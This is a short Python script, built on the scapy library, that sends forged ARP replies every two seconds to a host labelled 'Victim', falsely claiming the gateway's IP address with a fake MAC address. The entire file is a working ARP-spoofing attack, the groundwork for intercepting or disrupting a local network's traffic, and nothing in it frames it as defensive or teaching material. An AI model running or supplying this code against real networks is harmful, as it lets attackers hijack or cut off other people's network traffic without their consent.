from scapy.all import ARP, send
import time

target_ip = "192.168.100.15"       # Victim
gateway_ip = "192.168.100.1"       # Router
spoof_mac = "aa:bb:cc:dd:ee:ff"    # Fake MAC

print(f"⚠️ Sending fake ARP replies to {target_ip} pretending to be {gateway_ip}...")

packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=spoof_mac)

while True:
    send(packet, verbose=0)
    print(f"🚨 Spoofed ARP reply sent to {target_ip} from {gateway_ip} with MAC {spoof_mac}")
    time.sleep(2)  # Repeat every 2 seconds
